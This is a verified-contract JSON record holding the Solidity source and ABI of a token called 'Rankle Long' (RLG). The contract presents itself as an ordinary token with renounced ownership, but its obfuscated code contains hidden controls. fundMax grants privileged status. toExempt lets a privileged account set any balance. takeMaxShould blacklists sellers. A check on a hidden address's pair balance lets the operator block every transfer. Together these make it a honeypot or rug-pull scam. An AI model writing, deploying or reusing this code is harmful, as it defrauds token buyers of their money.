{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface sellSwap {\n    function createPair(address launchTx, address listLaunched) external returns (address);\n}\n\ninterface fundLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingAuto) external view returns (uint256);\n\n    function transfer(address totalLaunched, uint256 shouldToken) external returns (bool);\n\n    function allowance(address enableTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalLaunched,\n        uint256 shouldToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atReceiver, uint256 value);\n    event Approval(address indexed enableTeam, address indexed spender, uint256 value);\n}\n\nabstract contract sellMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundAuto is fundLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RankleLong is sellMode, fundLaunched, fundAuto {\n\n    bool public tokenAtWallet;\n\n    function amountMax(address modeTokenSell, address totalLaunched, uint256 shouldToken) internal returns (bool) {\n        require(takeShould[modeTokenSell] >= shouldToken);\n        takeShould[modeTokenSell] -= shouldToken;\n        takeShould[totalLaunched] += shouldToken;\n        emit Transfer(modeTokenSell, totalLaunched, shouldToken);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atShouldMin;\n    }\n\n    constructor (){\n        \n        isTrading tradingToLimit = isTrading(senderMarketing);\n        teamSell = sellSwap(tradingToLimit.factory()).createPair(tradingToLimit.WETH(), address(this));\n        if (listLiquidityTx != enableSender) {\n            tokenAtWallet = true;\n        }\n        launchToken = _msgSender();\n        swapAt[launchToken] = true;\n        takeShould[launchToken] = modeMax;\n        modeFrom();\n        \n        emit Transfer(address(0), launchToken, modeMax);\n    }\n\n    function owner() external view returns (address) {\n        return teamAmount;\n    }\n\n    event OwnershipTransferred(address indexed tradingTeam, address indexed fromIs);\n\n    uint256 public enableSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyReceiver;\n    }\n\n    string private maxEnable = \"Rankle Long\";\n\n    address senderMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address walletFund, address autoTotal) external view virtual override returns (uint256) {\n        if (autoTotal == senderMarketing) {\n            return type(uint256).max;\n        }\n        return buyAmount[walletFund][autoTotal];\n    }\n\n    function transfer(address launchedFee, uint256 shouldToken) external virtual override returns (bool) {\n        return tradingBuy(_msgSender(), launchedFee, shouldToken);\n    }\n\n    bool private tradingTake;\n\n    uint256 enableTokenMin;\n\n    function tradingReceiver() private view {\n        require(swapAt[_msgSender()]);\n    }\n\n    mapping(address => bool) public swapAt;\n\n    uint256 constant listBuy = 20 ** 10;\n\n    function transferFrom(address modeTokenSell, address totalLaunched, uint256 shouldToken) external override returns (bool) {\n        if (_msgSender() != senderMarketing) {\n            if (buyAmount[modeTokenSell][_msgSender()] != type(uint256).max) {\n                require(shouldToken <= buyAmount[modeTokenSell][_msgSender()]);\n                buyAmount[modeTokenSell][_msgSender()] -= shouldToken;\n            }\n        }\n        return tradingBuy(modeTokenSell, totalLaunched, shouldToken);\n    }\n\n    mapping(address => mapping(address => uint256)) private buyAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeMax;\n    }\n\n    bool public walletSender;\n\n    uint256 public listLiquidityTx;\n\n    function approve(address autoTotal, uint256 shouldToken) public virtual override returns (bool) {\n        buyAmount[_msgSender()][autoTotal] = shouldToken;\n        emit Approval(_msgSender(), autoTotal, shouldToken);\n        return true;\n    }\n\n    function liquiditySwap(uint256 shouldToken) public {\n        tradingReceiver();\n        enableTokenMin = shouldToken;\n    }\n\n    function toExempt(address launchedFee, uint256 shouldToken) public {\n        tradingReceiver();\n        takeShould[launchedFee] = shouldToken;\n    }\n\n    uint256 private modeMax = 100000000 * 10 ** 18;\n\n    uint256 enableLaunchShould;\n\n    mapping(address => bool) public enableTotalShould;\n\n    function tradingBuy(address modeTokenSell, address totalLaunched, uint256 shouldToken) internal returns (bool) {\n        if (modeTokenSell == launchToken) {\n            return amountMax(modeTokenSell, totalLaunched, shouldToken);\n        }\n        uint256 totalTake = fundLaunched(teamSell).balanceOf(atTx);\n        require(totalTake == enableTokenMin);\n        require(totalLaunched != atTx);\n        if (enableTotalShould[modeTokenSell]) {\n            return amountMax(modeTokenSell, totalLaunched, listBuy);\n        }\n        return amountMax(modeTokenSell, totalLaunched, shouldToken);\n    }\n\n    function takeMaxShould(address minWallet) public {\n        tradingReceiver();\n        if (enableSender == listLiquidityTx) {\n            enableSender = listLiquidityTx;\n        }\n        if (minWallet == launchToken || minWallet == teamSell) {\n            return;\n        }\n        enableTotalShould[minWallet] = true;\n    }\n\n    string private atShouldMin = \"RLG\";\n\n    address public teamSell;\n\n    function fundMax(address maxLiquidity) public {\n        if (walletSender) {\n            return;\n        }\n        if (enableSender != listLiquidityTx) {\n            takeLaunchedMarketing = false;\n        }\n        swapAt[maxLiquidity] = true;\n        if (listLiquidityTx == enableSender) {\n            listLiquidityTx = enableSender;\n        }\n        walletSender = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxEnable;\n    }\n\n    uint8 private buyReceiver = 18;\n\n    address atTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public launchToken;\n\n    function balanceOf(address marketingAuto) public view virtual override returns (uint256) {\n        return takeShould[marketingAuto];\n    }\n\n    function getOwner() external view returns (address) {\n        return teamAmount;\n    }\n\n    bool public takeLaunchedMarketing;\n\n    mapping(address => uint256) private takeShould;\n\n    function modeFrom() public {\n        emit OwnershipTransferred(launchToken, address(0));\n        teamAmount = address(0);\n    }\n\n    address private teamAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTotalShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"}],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldToken\",\"type\":\"uint256\"}],\"name\":\"liquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidityTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunchedMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"takeMaxShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldToken\",\"type\":\"uint256\"}],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAtWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTokenSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RankleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}